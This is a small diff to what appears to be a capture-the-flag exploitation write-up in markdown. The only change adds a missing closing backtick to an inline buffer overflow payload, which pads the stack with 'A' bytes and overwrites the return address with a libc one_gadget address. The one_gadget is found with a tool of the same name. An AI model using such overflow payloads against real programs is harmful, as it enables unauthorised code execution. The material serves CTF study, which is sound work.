@@ -178,7 +178,7 @@ then use `one_gadget` to find the address to jump:
 
 now we get the address, let's craft our payload:
 
-`'A'* (0x110 + 8) + p64((libc_base + 0x45216))  
+`'A'* (0x110 + 8) + p64((libc_base + 0x45216)) ` 
 
 
 ### other
